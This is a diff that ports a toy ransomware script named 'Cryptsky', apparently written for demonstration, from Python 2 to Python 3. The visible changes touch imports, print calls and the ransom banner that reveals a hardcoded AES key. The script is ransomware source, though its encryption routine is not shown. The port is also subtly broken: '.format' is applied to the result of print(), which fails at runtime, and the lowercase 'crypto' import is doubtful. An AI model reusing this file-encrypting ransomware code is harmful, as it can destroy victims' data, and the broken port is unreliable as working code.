@@ -1,6 +1,6 @@
 #!/usr/bin/env python
-from Crypto.Cipher import AES
-from Crypto.Util import Counter
+from crypto.Cipher import AES
+from crypto.Util import Counter
 import argparse
 import os
 
@@ -27,7 +27,7 @@ def main():
     decrypt = args['decrypt']
 
     if decrypt:
-        print '''
+        print('''
 Cryptsky!
 ---------------
 Your files have been encrypted. This is normally the part where I would
@@ -43,8 +43,8 @@ Happy decrypting and be more careful next time!
 
 Your decryption key is: '{}'
 
-'''.format(HARDCODED_KEY)
-        key = raw_input('Enter Your Key> ')
+''').format(HARDCODED_KEY)
+        key = input('Enter Your Key> ')
 
     else:
         # In real ransomware, this part includes complicated key generation,
